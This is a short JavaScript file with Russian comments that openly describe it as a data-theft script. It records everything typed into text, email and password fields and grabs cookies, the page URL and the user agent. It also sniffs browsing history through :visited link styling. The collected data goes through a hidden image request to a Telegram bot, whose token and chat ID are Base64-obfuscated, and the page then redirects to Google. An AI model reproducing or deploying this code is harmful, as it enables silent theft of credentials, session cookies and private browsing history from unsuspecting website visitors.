// --- КОНСТАНТЫ ---
// Обфусцированные константы Telegram (Base64)
const T = 'ODEzNzI1MDIxNjpBQUVFU1h2YVVJcmlOUHVaUFZheEw0X1Q2SUhoT0RhSG1rWQ=='; // Token
const C = 'ODA4OTgzOTI0Nw=='; // Chat ID

// Глобальный логгер для сбора ввода
let L = ""; 

// Перехват ввода
document.addEventListener('input', (e) => {
    const el = e.target;
    // Собираем данные из полей ввода
    if (el.type === 'text' || el.type === 'email' || el.type === 'password' || el.type === 'number' || el.tagName === 'TEXTAREA') {
        // Запись ID поля и текущего значения
        L += `[ID: ${el.id || el.name || el.type}] ${el.value}\n`;
    }
});

// Основная функция эксфильтрации данных
const P = () => {
    try {
        // Декодирование констант
        const K = atob(T); // Токен
        const I = atob(C); // ID

        // 1. Сбор Куки и Метаданных
        let R = "--- КРАЖА JS ---\n";
        R += `URL: ${window.location.href}\n`;
        R += `UA: ${navigator.userAgent.substring(0, 250)}\n`;
        R += "--- COOKIES ---\n";
        R += document.cookie ? document.cookie.substring(0, 1000) : "NONE\n"; 

        // 2. Добавление Перехваченного Ввода
        R += "--- INPUT LOGS ---\n";
        R += L || "NONE\n"; 

        // 3. Эксплуатация Истории (:visited)
        R += "--- HISTORY SNOOPING ---\n";
        const H = document.getElementById('history-checker');
        const links = H.getElementsByTagName('a');
        let S = 0; 

        for (let i = 0; i < links.length; i++) {
            // Проверка на красный цвет, заданный в CSS :visited
            const color = window.getComputedStyle(links[i]).color; 
            if (color === 'rgb(255, 0, 0)') { 
                R += `VISITED: ${links[i].href}\n`;
                S++;
            }
        }
        R += S ? `Total high-value hits: ${S}\n` : "NONE\n";

        // 4. Отправка в Telegram
        const msg = encodeURIComponent(R.substring(0, 4000));
        const u = `https://api.telegram.org/bot${K}/sendMessage?chat_id=${I}&text=${msg}`;

        // Использование Image() для отправки - самый тихий метод (GET запрос)
        const img = new Image();
        img.src = u;
        // Добавление в DOM не обязательно, но гарантирует, что запрос будет отправлен
        document.body.appendChild(img).style.display = 'none';

    } catch (e) {
        // Тихое игнорирование ошибок
    }
};

// --- ЗАПУСК ---
window.onload = () => {
    // Ждем 0.5 сек для сбора начальных данных и ввода
    setTimeout(P, 500); 
    
    // Перенаправление через 2 секунды
    setTimeout(() => {
        // Перенаправление на нейтральный сайт
        window.location.replace("https://www.google.com"); 
    }, 2000); 
};
